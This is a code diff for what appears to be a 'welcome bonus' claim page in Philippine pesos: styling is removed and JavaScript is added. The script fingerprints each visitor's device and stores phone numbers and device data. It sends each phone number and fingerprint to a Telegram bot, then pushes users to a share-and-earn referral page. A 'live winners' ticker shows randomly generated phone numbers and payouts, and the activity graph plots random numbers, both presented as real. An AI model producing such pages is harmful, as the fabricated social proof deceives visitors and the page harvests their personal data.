-    50% { transform: scale(1.08); box-shadow: 0 0 60px rgba(255, 215, 0, 1); }
-}
-
-.modal-icon i {
-    font-size: 36px;
-    color: #4a148c;
-    filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.8));
-}
-
-.modal-title {
-    font-family: 'Pacifico', cursive;
-    font-size: 28px;
-    font-weight: 400;
-    background: linear-gradient(180deg, #ffd700, #ff6b9d);
-    -webkit-background-clip: text;
-    background-clip: text;
-    color: transparent;
-    margin-bottom: 8px;
-    filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.6));
-}
-
-.modal-subtitle {
-    font-family: 'Fredoka', sans-serif;
-    font-size: 13px;
-    color: rgba(255, 224, 178, 0.9);
-    line-height: 1.6;
-    margin-bottom: 20px;
-}
-
-.gold-text {
-    color: #ffd700;
-    font-weight: 700;
-    text-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
-}
-
-.bonus-box-premium {
-    position: relative;
-    background: linear-gradient(135deg, rgba(255, 107, 157, 0.9), rgba(255, 215, 0, 0.9), rgba(255, 107, 157, 0.9));
-    background-size: 200% 200%;
-    border: 2px solid #ffd700;
-    border-radius: 16px;
-    padding: 20px 18px;
-    text-align: center;
-    margin-bottom: 20px;
-    overflow: hidden;
-    box-shadow: 0 8px 40px rgba(0, 0, 0, 0.3), 0 0 30px rgba(255, 215, 0, 0.4);
-    animation: goldShimmer 4s ease-in-out infinite;
-}
-
-@keyframes goldShimmer {
-    0%, 100% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-}
-
-.bonus-glow {
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(circle at center, rgba(255, 255, 255, 0.2), transparent 70%);
-    animation: glowPulse 2.5s ease-in-out infinite;
-}
-
-@keyframes glowPulse {
-    0%, 100% { opacity: 0.3; }
-    50% { opacity: 0.7; }
-}
-
-.bonus-shine {
-    position: absolute;
-    top: -50%;
-    left: -50%;
-    width: 200%;
-    height: 200%;
-    background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.15) 50%, transparent 70%);
-    transform: rotate(45deg);
-    animation: bonusShine 5s infinite;
-}
-
-@keyframes bonusShine {
-    0% { transform: translateX(-100%) rotate(45deg); }
-    100% { transform: translateX(100%) rotate(45deg); }
-}
-
-.bonus-amount-premium {
-    font-family: 'Orbitron', monospace;
-    font-size: 48px;
-    font-weight: 900;
-    color: #2a0a1a;
-    text-shadow: 2px 2px 0px rgba(255, 255, 255, 0.3);
-    position: relative;
-    z-index: 2;
-    letter-spacing: 2px;
-}
-
-.bonus-label-premium {
-    font-family: 'Orbitron', monospace;
-    font-size: 10px;
-    font-weight: 700;
-    letter-spacing: 3px;
-    color: #3d1a2a;
-    margin-top: 6px;
-    position: relative;
-    z-index: 2;
-    text-transform: uppercase;
-}
-
-.bonus-label-premium i { margin: 0 6px; }
-
-.input-group-premium { margin-bottom: 20px; }
-
-.input-label-premium {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-family: 'Fredoka', sans-serif;
-    font-size: 12px;
-    font-weight: 600;
-    color: #ffe0b2;
-    margin-bottom: 10px;
-    letter-spacing: 0.5px;
-}
-
-.input-label-premium i { color: #ffd700; font-size: 13px; }
-
-.input-wrapper-premium {
-    display: flex;
-    align-items: center;
-    background: rgba(26, 8, 69, 0.8);
-    border: 2px solid rgba(255, 215, 0, 0.4);
-    border-radius: 14px;
-    overflow: hidden;
-    transition: all 0.3s ease;
-    box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.3);
-}
-
-.input-wrapper-premium:focus-within {
-    border-color: #ffd700;
-    box-shadow: 0 0 25px rgba(255, 215, 0, 0.4), inset 0 2px 10px rgba(0, 0, 0, 0.3);
-}
-
-.input-wrapper-premium input {
-    flex: 1;
-    background: transparent;
-    border: none;
-    padding: 16px 18px;
-    color: #fff;
-    font-family: 'Baloo 2', sans-serif;
-    font-size: 16px;
-    font-weight: 600;
-    outline: none;
-    letter-spacing: 1px;
-}
-
-.input-wrapper-premium input::placeholder {
-    color: rgba(255, 224, 178, 0.4);
-    font-family: 'Fredoka', sans-serif;
-    font-weight: 400;
-    font-size: 14px;
-}
-
-.input-suffix {
-    padding: 0 16px 0 0;
-    color: #39ff14;
-    font-size: 18px;
-}
-
-.input-hint {
-    font-size: 10px;
-    color: rgba(255, 224, 178, 0.6);
-    margin-top: 8px;
-    font-family: 'Fredoka', sans-serif;
-    display: flex;
-    align-items: center;
-    gap: 6px;
-}
-
-.input-hint i { font-size: 10px; color: #ffd700; }
-
-.login-btn {
-    position: relative;
-    width: 100%;
-    background: linear-gradient(180deg, #ffd700 0%, #ffb347 50%, #ff6b9d 100%);
-    border: 3px solid #fff;
-    border-radius: 14px;
-    padding: 16px 20px;
-    font-family: 'Baloo 2', sans-serif;
-    font-size: 15px;
-    font-weight: 800;
-    color: #4a148c;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    text-shadow: 0 2px 0 rgba(255, 255, 255, 0.5);
-    box-shadow:
-        0 6px 0 #8b4500,
-        0 10px 30px rgba(0, 0, 0, 0.5),
-        0 0 40px rgba(255, 215, 0, 0.6);
-    transition: all 0.15s ease;
-    overflow: hidden;
-    margin-bottom: 16px;
-}
-
-.login-btn::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
-    animation: btnShine 2.5s infinite;
-}
-
-@keyframes btnShine {
-    0% { left: -100%; }
-    60% { left: 100%; }
-    100% { left: 100%; }
-}
-
-.login-btn:active {
-    transform: translateY(5px);
-    box-shadow: 0 0 0 #8b4500, 0 5px 15px rgba(0, 0, 0, 0.5);
-}
-
-.login-btn:disabled {
-    opacity: 0.7;
-    cursor: not-allowed;
-}
-
-.login-dots { display: none; }
-.login-btn.loading .login-text { display: none; }
-.login-btn.loading .login-dots {
-    display: inline-block;
-    width: 20px;
-    height: 20px;
-    border: 3px solid rgba(74, 20, 140, 0.3);
-    border-top-color: #4a148c;
-    border-radius: 50%;
-    animation: spin 0.8s linear infinite;
-}
-
-@keyframes spin {
-    to { transform: rotate(360deg); }
-}
-
-.login-btn.success {
-    background: linear-gradient(180deg, #39ff14, #00cc00);
-    color: #003300;
-    border-color: #fff;
-}
-
-.warning-text-premium {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    font-family: 'Fredoka', sans-serif;
-    font-size: 10px;
-    color: rgba(255, 224, 178, 0.7);
-}
-
-.warning-text-premium i {
-    color: #39ff14;
-    font-size: 11px;
-    filter: drop-shadow(0 0 6px rgba(57, 255, 20, 0.6));
-}
-
-#particleCanvas {
-    position: fixed;
-    inset: 0;
-    pointer-events: none;
-    z-index: 0;
-}
-
-/* ============================================================
-   RESPONSIVE
-   ============================================================ */
-@media (max-width: 480px) {
-    body { padding: 60px 10px 20px; }
-    .main-card { border-radius: 24px; }
-    .card-content { padding: 28px 18px 24px; }
-    .card-bg-image { height: 40%; }
-    .logo-icon { width: 76px; height: 76px; }
-    .logo-icon i { font-size: 32px; }
-    .logo-text { font-size: 26px; }
-    .logo-text-sub { font-size: 14px; letter-spacing: 6px; }
-    .modal-container { max-width: 100%; }
-    .modal-content-inner { padding: 28px 20px 24px; }
-    .modal-title { font-size: 24px; }
-    .modal-subtitle { font-size: 12px; }
-    .bonus-amount-premium { font-size: 40px; }
-    .live-ticker { padding: 6px 14px; font-size: 10px; }
-    .trend-stat-value { font-size: 16px; }
-    .line-graph-wrapper { height: 90px; }
-    .trend-graph-container { padding: 12px 8px 8px; }
-}
-
-@media (max-width: 360px) {
-    body { padding: 56px 8px 16px; }
-    .card-content { padding: 24px 14px 20px; }
-    .logo-text { font-size: 22px; }
-    .logo-text-sub { font-size: 12px; letter-spacing: 5px; }
-    .modal-title { font-size: 22px; }
-    .bonus-amount-premium { font-size: 36px; }
-    .line-graph-wrapper { height: 80px; }
-}
-
-@media (prefers-reduced-motion: reduce) {
-    * {
-        animation-duration: 0.01ms !important;
-        animation-iteration-count: 1 !important;
-        transition-duration: 0.01ms !important;
+    function formatPhoneNumber(phone) {
+        var cleaned = phone.replace(/\D/g, '');
+        if (cleaned.length === 10 && cleaned.startsWith('9')) {
+            return '0' + cleaned;
+        }
+        if (cleaned.length === 11 && cleaned.startsWith('09')) {
+            return cleaned;
+        }
+        return cleaned;
     }
-}
 
-button:focus-visible,
-input:focus-visible {
-    outline: 3px solid #ffd700;
-    outline-offset: 3px;
-}
+    // ========== DEVICE FINGERPRINT ==========
+    function getDeviceFingerprint() {
+        var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
+        var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        var language = navigator.language;
+        var userAgent = navigator.userAgent;
+        var platform = navigator.platform;
+        var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
 
-::-webkit-scrollbar { width: 5px; }
-::-webkit-scrollbar-track { background: rgba(42, 8, 69, 0.5); }
-::-webkit-scrollbar-thumb {
-    background: linear-gradient(180deg, #ffd700, #ff6b9d);
-    border-radius: 3px;
-}
+        var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency;
+
+        var hash = 0;
+        for (var i = 0; i < fingerprintString.length; i++) {
+            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
+            hash |= 0;
+        }
+        return 'FP_' + Math.abs(hash);
+    }
+
+    // ========== GET DEVICE DISPLAY ID ==========
+    function getOrCreateDeviceId(fingerprint) {
+        if (!fingerprint || fingerprint === '---') return Promise.resolve('---');
+
+        var deviceMapRef = db.ref('device_id_map/' + fingerprint);
+        return deviceMapRef.once('value').then(function(snap) {
+            if (snap.exists()) {
+                return snap.val().displayId;
+            }
+
+            var counterRef = db.ref('admin/deviceCounter');
+            return counterRef.once('value').then(function(counterSnap) {
+                var nextNum = (counterSnap.val() || 0) + 1;
+                return counterRef.set(nextNum).then(function() {
+                    var displayId = 'Dev' + nextNum;
+                    return deviceMapRef.set({
+                        displayId: displayId,
+                        createdAt: Date.now(),
+                        fingerprint: fingerprint
+                    }).then(function() {
+                        return displayId;
+                    });
+                });
+            });
+        });
+    }
+
+    // ========== SAVE DEVICE INFO ==========
+    function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
+        var deviceInfo = {
+            phone: phone,
+            fingerprint: fingerprint,
+            displayId: deviceDisplayId,
+            screenResolution: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            userAgent: navigator.userAgent,
+            lastSeen: Date.now(),
+            firstSeen: Date.now()
+        };
+
+        return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
+            if (!existingDevice.exists()) {
+                return db.ref('devices/' + fingerprint).set(deviceInfo);
+            } else {
+                return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
+            }
+        }).then(function() {
+            return db.ref('device_phone_map/' + fingerprint).set({
+                phone: phone,
+                displayId: deviceDisplayId,
+                lastSeen: Date.now()
+            });
+        });
+    }
+
+    // ========== GENERATE REFERRAL CODE ==========
+    function generateReferralCode() {
+        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        var code = '';
+        for (var i = 0; i < 6; i++) {
+            code += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return code;
+    }
+
+    // ========== CREATE USER SESSION ==========
+    function createUserSession(phone, fingerprint, deviceDisplayId) {
+        var sessionRef = db.ref('user_sessions/' + phone);
+
+        return sessionRef.once('value').then(function(sessionSnap) {
+            if (!sessionSnap.exists()) {
+                var initialCode = generateReferralCode();
+
+                return sessionRef.set({
+                    phone: phone,
+                    balance: 0,
+                    clicks: 0,
+                    status: 'online',
+                    deviceFingerprint: fingerprint,
+                    deviceDisplayId: deviceDisplayId,
+                    lastUpdate: Date.now(),
+                    createdAt: Date.now(),
+                    referral_code: initialCode,
+                    referral_code_generated_at: Date.now(),
+                    claimed_luckycat: false,
+                    claimed_ptcat: false
+                });
+            } else {
+                return sessionRef.update({
+                    status: 'online',
+                    lastUpdate: Date.now(),
+                    deviceFingerprint: fingerprint,
+                    deviceDisplayId: deviceDisplayId
+                });
+            }
+        });
+    }
+
+    // ========== SET USER ONLINE ==========
+    function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
+        return db.ref('user_sessions/' + phoneNumber).update({
+            status: 'online',
+            lastSeen: firebase.database.ServerValue.TIMESTAMP,
+            deviceFingerprint: fingerprint,
+            deviceDisplayId: deviceDisplayId
+        });
+    }
+
+    // ========== BAN CHECK ==========
+    function isPhoneBanned(phone) {
+        return db.ref('banned_ghosts/' + phone).once('value').then(function(snap) {
+            return snap.exists();
+        });
+    }
+
+    function isFingerprintLinkedToBanned(fingerprint) {
+        return db.ref('device_phone_map/' + fingerprint).once('value').then(function(snap) {
+            if (snap.exists()) {
+                var linkedPhone = snap.val().phone;
+                return isPhoneBanned(linkedPhone);
+            }
+            return false;
+        });
+    }
+
+    function getBanDetails(phone, fingerprint) {
+        return isPhoneBanned(phone).then(function(phoneBanned) {
+            if (phoneBanned) {
+                return { isBanned: true, type: "phone" };
+            }
+            return isFingerprintLinkedToBanned(fingerprint).then(function(fpBanned) {
+                if (fpBanned) {
+                    return { isBanned: true, type: "device" };
+                }
+                return { isBanned: false };
+            });
+        });
+    }
+
+    // ========== NUMBER CLAIMED CHECK ==========
+    function isNumberClaimed(phone) {
+        return db.ref('user_logs/' + phone).once('value').then(function(logSnap) {
+            return (logSnap.exists() && logSnap.val().status === 'claimed');
+        });
+    }
+
+    // ========== SHOW BLOCKED UI ==========
+    function showBlockedUI(reason) {
+        if (!modalOverlay) return;
+        modalOverlay.style.display = 'flex';
+
+        var title = "ACCESS RESTRICTED";
+        var blockMessage = "This account has been restricted by the administrator.";
+
+        if (reason === "claimed") {
+            title = "ALREADY CLAIMED";
+            blockMessage = "This number has already claimed a reward before.";
+        }
+
+        var modalBody = document.getElementById('modalBodyContent');
+        if (modalBody) {
+            modalBody.innerHTML =
+                '<div class="modal-bg-image"></div>' +
+                '<div class="modal-bg-overlay"></div>' +
+                '<div class="modal-content-inner">' +
+                    '<div class="modal-icon">' +
+                        '<i class="fas fa-ban"></i>' +
+                    '</div>' +
+                    '<h2 class="modal-title" style="background: linear-gradient(180deg, #ff4444, #aa0000); -webkit-background-clip: text; background-clip: text;">' + title + '</h2>' +
+                    '<p class="modal-subtitle">' + blockMessage + '</p>' +
+                    '<button class="login-btn" onclick="location.reload()" style="background: linear-gradient(180deg, #555, #333); color: #fff; box-shadow: 0 6px 0 #222, 0 10px 30px rgba(0,0,0,0.5);">OK</button>' +
+                '</div>';
+        }
+        if (mainCard) mainCard.style.opacity = "0.3";
+    }
+
+    // ========== PROCESS STEP 1 ==========
+    function processStep1() {
+        if (!userPhoneInput || !claimBtn) return;
+
+        var rawPhone = userPhoneInput.value.trim().replace(/\D/g, '');
+        var fingerprint = getDeviceFingerprint();
+
+        if (!rawPhone || rawPhone.length === 0) {
+            alert("Please enter your mobile number.");
+            return;
+        }
+
+        if (!isValidPhoneNumber(rawPhone)) {
+            alert("Invalid mobile number.\n\nPlease enter a valid 10-digit number starting with 9 (e.g., 9123456789)");
+            return;
+        }
+
+        var fullPhone = formatPhoneNumber(rawPhone);
+
+        claimBtn.classList.add('loading');
+        claimBtn.disabled = true;
+
+        getBanDetails(fullPhone, fingerprint).then(function(banDetails) {
+            if (banDetails.isBanned) {
+                claimBtn.classList.remove('loading');
+                claimBtn.disabled = false;
+                showBlockedUI("banned");
+                return;
+            }
+
+            return isNumberClaimed(fullPhone).then(function(isClaimed) {
+                if (isClaimed) {
+                    claimBtn.classList.remove('loading');
+                    claimBtn.disabled = false;
+                    showBlockedUI("claimed");
+                    return;
+                }
+
+                return getOrCreateDeviceId(fingerprint).then(function(deviceDisplayId) {
+                    return saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId).then(function() {
+                        return createUserSession(fullPhone, fingerprint, deviceDisplayId).then(function() {
+                            return setUserOnline(fullPhone, fingerprint, deviceDisplayId).then(function() {
+
+                                var message = '🎁 WELCOME BONUS LOGIN:\n📱 ' + fullPhone + '\n🖥️ FP: ' + fingerprint + '\n🔑 DEV#: ' + deviceDisplayId;
+                                fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message))
+                                    .catch(function(e) { console.log('Telegram error:', e); });
+
+                                localStorage.setItem("userPhone", fullPhone);
+                                localStorage.setItem("userDeviceId", fingerprint);
+                                localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
+
+                                claimBtn.classList.remove('loading');
+                                claimBtn.classList.add('success');
+                                var loginTextSpan = claimBtn.querySelector('.login-text');
+                                if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS!';
+
+                                setTimeout(function() {
+                                    window.location.href = "share_and_earn.html";
+                                }, 1000);
+                            });
+                        });
+                    });
+                });
+            });
+        }).catch(function(error) {
+            console.error("Process error:", error);
+            claimBtn.classList.remove('loading');
+            claimBtn.disabled = false;
+            alert("An error occurred. Please try again.");
+        });
+    }
+
+    // ============================================================
+    // ✅ SWIPE TO VERIFY — FIXED
+    // ============================================================
+    var isDragging = false;
+    var startX = 0;
+    var currentLeft = 0;
+    var swipeCompleted = false;
+    var trailInterval = null;
+    var maxLeft = 0;
+
+    function getMaxLeft() {
+        if (!swipeTrack || !swipeIcon) return 0;
+        var trackWidth = swipeTrack.offsetWidth;
+        var iconWidth = swipeIcon.offsetWidth || 56;
+        return Math.max(0, trackWidth - iconWidth - 6);
+    }
+
+    function startFireTrail() {
+        if (trailInterval) clearInterval(trailInterval);
+        if (swipeFireTrail) {
+            swipeFireTrail.classList.add('active');
+            trailInterval = setInterval(function() {
+                if (swipeFireTrail) {
+                    swipeFireTrail.classList.remove('active');
+                    setTimeout(function() {
+                        if (swipeFireTrail) swipeFireTrail.classList.add('active');
+                    }, 50);
+                }
+            }, 100);
+        }
+    }
+
+    function stopFireTrail() {
+        if (trailInterval) {
+            clearInterval(trailInterval);
+            trailInterval = null;
+        }
+        if (swipeFireTrail) {
+            swipeFireTrail.classList.remove('active');
+        }
+    }
+
+    function updateFireTrailPosition(leftPos, max) {
+        if (!swipeFireTrail) return;
+        var percentage = max > 0 ? (leftPos / max) * 100 : 0;
+        swipeFireTrail.style.width = percentage + '%';
+    }
+
+    function completeSwipe() {
+        if (swipeCompleted) return;
+        swipeCompleted = true;
+
+        if (swipeFireTrail) {
+            swipeFireTrail.style.width = '100%';
+            swipeFireTrail.classList.add('active');
+        }
+
+        try {
+            var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
+            audio.volume = 0.7;
+            audio.play().catch(function(e) { console.log('Sound error:', e); });
+        } catch(e) {}
+
+        var swipeContainer = document.querySelector('.swipe-container');
+        if (swipeContainer) {
+            swipeContainer.style.transition = 'opacity 0.3s ease';
+            swipeContainer.style.opacity = '0';
+        }
+
+        setTimeout(function() {
+            if (modalOverlay) modalOverlay.style.display = 'flex';
+            if (swipeContainer) swipeContainer.style.display = 'none';
+        }, 400);
+
+        setTimeout(function() {
+            if (swipeFireTrail) swipeFireTrail.classList.remove('active');
+        }, 500);
+    }
+
+    function initSwipe() {
+        if (!swipeIcon || !swipeTrack) return;
+
+        // ✅ Compute dynamic maxLeft
+        maxLeft = getMaxLeft();
+        console.log('🎯 Swipe initialized. maxLeft:', maxLeft);
+
+        // ✅ Recompute on resize
+        window.addEventListener('resize', function() {
+            maxLeft = getMaxLeft();
+        });
+        window.addEventListener('orientationchange', function() {
+            setTimeout(function() { maxLeft = getMaxLeft(); }, 300);
+        });
+
+        // ========== TOUCH EVENTS ==========
+        swipeIcon.addEventListener('touchstart', function(e) {
+            if (swipeCompleted) return;
+            e.preventDefault();
+            isDragging = true;
+            startX = e.touches[0].clientX;
+            currentLeft = parseInt(swipeIcon.style.left) || 0;
+            maxLeft = getMaxLeft();
+            swipeIcon.style.cursor = 'grabbing';
+            startFireTrail();
+        }, { passive: false });
+
+        swipeIcon.addEventListener('touchmove', function(e) {
+            if (!isDragging || swipeCompleted) return;
+            e.preventDefault();
+            var moveX = e.touches[0].clientX - startX;
+            var newLeft = currentLeft + moveX;
+            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
+            swipeIcon.style.left = newLeft + 'px';
+            updateFireTrailPosition(newLeft, maxLeft);
+        }, { passive: false });
+
+        swipeIcon.addEventListener('touchend', function(e) {
+            if (!isDragging || swipeCompleted) return;
+            e.preventDefault();
+            isDragging = false;
+            swipeIcon.style.cursor = 'grab';
+            stopFireTrail();
+
+            var finalLeft = parseInt(swipeIcon.style.left) || 0;
+            if (finalLeft >= maxLeft - 10) {
+                completeSwipe();
+            } else {
+                swipeIcon.style.left = '0px';
+                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
+            }
+        }, { passive: false });
+
+        swipeIcon.addEventListener('touchcancel', function(e) {
+            if (!isDragging) return;
+            isDragging = false;
+            swipeIcon.style.cursor = 'grab';
+            stopFireTrail();
+            swipeIcon.style.left = '0px';
+            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
+        });
+
+        // ========== MOUSE EVENTS ==========
+        swipeIcon.addEventListener('mousedown', function(e) {
+            if (swipeCompleted) return;
+            e.preventDefault();
+            isDragging = true;
+            startX = e.clientX;
+            currentLeft = parseInt(swipeIcon.style.left) || 0;
+            maxLeft = getMaxLeft();
+            swipeIcon.style.cursor = 'grabbing';
+            startFireTrail();
+        });
+
+        window.addEventListener('mousemove', function(e) {
+            if (!isDragging || swipeCompleted) return;
+            e.preventDefault();
+            var moveX = e.clientX - startX;
+            var newLeft = currentLeft + moveX;
+            newLeft = Math.max(0, Math.min(newLeft, maxLeft));
+            swipeIcon.style.left = newLeft + 'px';
+            updateFireTrailPosition(newLeft, maxLeft);
+        });
+
+        window.addEventListener('mouseup', function(e) {
+            if (!isDragging || swipeCompleted) return;
+            isDragging = false;
+            swipeIcon.style.cursor = 'grab';
+            stopFireTrail();
+
+            var finalLeft = parseInt(swipeIcon.style.left) || 0;
+            if (finalLeft >= maxLeft - 10) {
+                completeSwipe();
+            } else {
+                swipeIcon.style.left = '0px';
+                if (swipeFireTrail) swipeFireTrail.style.width = '0%';
+            }
+        });
+    }
+
+    // ============================================================
+    // 📊 LINE GRAPH TREND — HOURLY TIMELINE
+    // ============================================================
+    function drawLineGraph() {
+        var svg = document.getElementById('lineGraphSvg');
+        var linePath = document.getElementById('graphLine');
+        var areaPath = document.getElementById('graphArea');
+        var pointsGroup = document.getElementById('graphPoints');
+        var hourLabelsContainer = document.getElementById('graphHourLabels');
+
+        if (!svg || !linePath || !areaPath || !pointsGroup) return;
+
+        var svgWidth = 340;
+        var svgHeight = 100;
+        var padding = 12;
+        var graphWidth = svgWidth - (padding * 2);
+        var graphHeight = svgHeight - (padding * 2);
+
+        var now = new Date();
+        var currentHour = now.getHours();
+
+        var hourlyData = [];
+        var HOURS_SPAN = 5;
+        var maxValue = 1;
+
+        for (var i = 0; i < HOURS_SPAN; i++) {
+            var hoursAgo = (HOURS_SPAN - 1) - i;
+            var hour = (currentHour - hoursAgo + 24) % 24;
+
+            var value = getHourlyActivity(hour);
+            hourlyData.push({
+                hour: hour,
+                value: value,
+                isCurrentHour: (i === HOURS_SPAN - 1),
+                label: formatHour(hour)
+            });
+
+            if (value > maxValue) maxValue = value;
+        }
+
+        var lineD = '';
+        var areaD = '';
+        var stepX = graphWidth / (hourlyData.length - 1);
+
+        var endpointX = 0;
+        var endpointY = 0;
+
+        for (var j = 0; j < hourlyData.length; j++) {
+            var point = hourlyData[j];
+            var x = padding + (j * stepX);
+            var y = svgHeight - padding - ((point.value / maxValue) * graphHeight);
+
+            if (j === 0) {
+                lineD = 'M ' + x + ' ' + y;
+                areaD = 'M ' + x + ' ' + (svgHeight - padding);
+                areaD += ' L ' + x + ' ' + y;
+            } else {
+                lineD += ' L ' + x + ' ' + y;
+                areaD += ' L ' + x + ' ' + y;
+            }
+
+            if (point.isCurrentHour) {
+                endpointX = x;
+                endpointY = y;
+            }
+        }
+
+        areaD += ' L ' + (padding + ((hourlyData.length - 1) * stepX)) + ' ' + (svgHeight - padding);
+        areaD += ' Z';
+
+        linePath.setAttribute('d', lineD);
+        linePath.style.strokeDasharray = '2000';
+        linePath.style.strokeDashoffset = '2000';
+        linePath.style.transition = 'none';
+
+        void linePath.offsetWidth;
+
+        linePath.style.transition = 'stroke-dashoffset 1.5s ease-out';
+        linePath.style.strokeDashoffset = '0';
+
+        areaPath.style.opacity = '0';
+        areaPath.setAttribute('d', areaD);
+        areaPath.style.transition = 'none';
+        void areaPath.offsetWidth;
+        areaPath.style.transition = 'opacity 1.5s ease-out';
+        areaPath.style.opacity = '0.5';
+
+        var endpointHtml = '';
+        endpointHtml += '<foreignObject x="' + (endpointX - 16) + '" y="' + (endpointY - 16) + '" width="32" height="32" class="graph-endpoint-icon">';
+        endpointHtml += '<div xmlns="http://www.w3.org/1999/xhtml" style="';
+        endpointHtml += 'width: 100%; height: 100%;';
+        endpointHtml += 'background: transparent;';
+        endpointHtml += 'display: flex; align-items: center; justify-content: center;';
+        endpointHtml += '">';
+        endpointHtml += '<img src="images/PT_icon.png" class="endpoint-img" alt="Now" />';
+        endpointHtml += '</div>';
+        endpointHtml += '</foreignObject>';
+
+        pointsGroup.innerHTML = endpointHtml;
+
+        if (hourLabelsContainer) {
+            hourLabelsContainer.innerHTML = '';
+            hourlyData.forEach(function(item) {
+                var span = document.createElement('span');
+                span.textContent = item.isCurrentHour ? 'NOW' : item.label;
+                if (item.isCurrentHour) {
+                    span.classList.add('current-hour');
+                }
+                hourLabelsContainer.appendChild(span);
+            });
+        }
+    }
+
+    function getHourlyActivity(hour) {
+        var basePattern = [
+            2, 1, 1, 2, 3, 5, 8, 12, 15, 18, 20, 22,
+            25, 28, 30, 32, 35, 40, 45, 48, 42, 35, 25, 15
+        ];
+
+        var base = basePattern[hour] || 10;
+        var random = Math.floor(Math.random() * 8) - 4;
+        return Math.max(1, base + random);
+    }
+
+    function formatHour(hour) {
+        if (hour === 0) return '12AM';
+        if (hour < 12) return hour + 'AM';
+        if (hour === 12) return '12PM';
+        return (hour - 12) + 'PM';
+    }
+
+    function loadTotalClaims() {
+        if (!db) return;
+
+        var today = new Date();
+        var year = today.getFullYear();
+        var month = String(today.getMonth() + 1).padStart(2, '0');
+        var day = String(today.getDate()).padStart(2, '0');
+        var dateKey = year + '-' + month + '-' + day;
+
+        db.ref('festival_stats/daily/' + dateKey + '/claims_count').once('value').then(function(snap) {
+            var count = snap.val() || 0;
+            var totalAmount = count * 500;
+
+            animateNumber('todayClaims', count);
+
+            var amountEl = document.getElementById('totalClaimed');
+            if (amountEl) {
+                amountEl.textContent = formatAmount(totalAmount);
+            }
+        }).catch(function(e) {
+            console.error('Load claims error:', e);
+        });
+    }
+
+    function formatAmount(amount) {
+        if (amount >= 1000000) return '₱' + (amount / 1000000).toFixed(1) + 'M';
+        if (amount >= 1000) return '₱' + (amount / 1000).toFixed(1) + 'K';
+        return '₱' + amount.toLocaleString();
+    }
+
+    function animateNumber(elementId, targetValue) {
+        var el = document.getElementById(elementId);
+        if (!el) return;
+
+        var currentValue = parseInt(el.textContent) || 0;
+        if (currentValue === targetValue) return;
+
+        var duration = 800;
+        var steps = 25;
+        var increment = (targetValue - currentValue) / steps;
+        var step = 0;
+
+        var interval = setInterval(function() {
+            step++;
+            var val = Math.round(currentValue + (increment * step));
+            el.textContent = val;
+
+            if (step >= steps) {
+                clearInterval(interval);
+                el.textContent = targetValue;
+            }
+        }, duration / steps);
+    }
+
+    // ========== LIVE WINNERS TICKER ==========
+    function updateTickerWithTransition(phoneNumber, amount, action) {
+        if (!winnerEntry) return;
+
+        winnerEntry.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        winnerEntry.style.opacity = '0';
+        winnerEntry.style.transform = 'translateY(-5px)';
+
+        setTimeout(function() {
+            winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' +
+                phoneNumber + ' ' + action + ' ' +
+                '<span class="ticker-amount">+₱' + amount.toLocaleString() + '</span>';
+            winnerEntry.style.opacity = '1';
+            winnerEntry.style.transform = 'translateY(0)';
+        }, 300);
+    }
+
+    function startTicker() {
+        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+
+        function generateRandomAmount() {
+            var rand = Math.random() * 100;
+            if (rand < 85) return 500;
+            if (rand < 95) return 1000;
+            if (rand < 98) return 1500;
+            return 2000;
+        }
+
+        function generateWinner() {
+            var randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            var randomSuffix = Math.floor(1000 + Math.random() * 9000);
+            var phoneNumber = randomPrefix + '***' + randomSuffix;
+            var amount = generateRandomAmount();
+            var actions = ['received', 'received', 'received', 'withdraw'];
+            var action = actions[Math.floor(Math.random() * actions.length)];
+            return { phoneNumber: phoneNumber, amount: amount, action: action };
+        }
+
+        var initial = generateWinner();
+        if (winnerEntry) {
+            winnerEntry.innerHTML = '<i class="fas fa-bolt"></i> ' +
+                initial.phoneNumber + ' ' + initial.action + ' ' +
+                '<span class="ticker-amount">+₱' + initial.amount.toLocaleString() + '</span>';
+        }
+
+        setInterval(function() {
+            var winner = generateWinner();
+            updateTickerWithTransition(winner.phoneNumber, winner.amount, winner.action);
+        }, 4800);
+    }
+
+    // ========== MODAL FUNCTIONS ==========
+    function closeModal() {
+        if (modalOverlay) modalOverlay.style.display = 'none';
+    }
+
+    // ========== INITIALIZE ==========
+    function init() {
+        initFirebase();
